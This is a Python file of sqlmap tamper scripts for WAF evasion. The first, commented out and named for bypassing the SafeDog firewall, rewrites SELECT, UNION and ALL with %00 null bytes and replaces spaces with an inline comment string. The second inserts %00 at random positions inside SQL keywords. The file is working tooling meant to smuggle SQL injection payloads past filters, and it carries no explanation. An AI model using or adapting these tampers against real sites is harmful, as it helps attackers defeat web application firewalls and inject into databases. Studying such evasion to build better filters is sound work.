#!/usr/bin/env python

# from lib.core.enums import PRIORITY
# from lib.core.settings import UNICODE_ENCODING

# __priority__ = PRIORITY.LOWEST

# def dependencies():
# 	pass

# def tamper(payload, **kwargs):

# 	if payload:
# 		bypass_SafeDog_str = '/*50010/'
# 		payload=payload.replace("SELECT","se%00lect")
# 		payload=payload.replace("ALL","a%00ll")
# 		payload=payload.replace("UNION","un%00ion")
# 		payload=payload.replace('%20',bypass_SafeDog_str)
# 		payload=payload.replace(' ',bypass_SafeDog_str)

# 	return payload

#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.common import randomRange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    Add random comments to SQL keywords

    >>> import random
    >>> random.seed(0)
    >>> tamper('INSERT')
    'I%00N%00SERT'
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"\b[A-Za-z_]+\b", payload):
            word = match.group()

            if len(word) < 2:
                continue

            if word.upper() in kb.keywords:
                _ = word[0]

                for i in xrange(1, len(word) - 1):
                    _ += "%s%s" % ("%00" if randomRange(0, 1) else "", word[i])

                _ += word[-1]

                if "%00" not in _:
                    index = randomRange(1, len(word) - 1)
                    _ = word[:index] + "%00" + word[index:]

                retVal = retVal.replace(word, _)

    return retVal
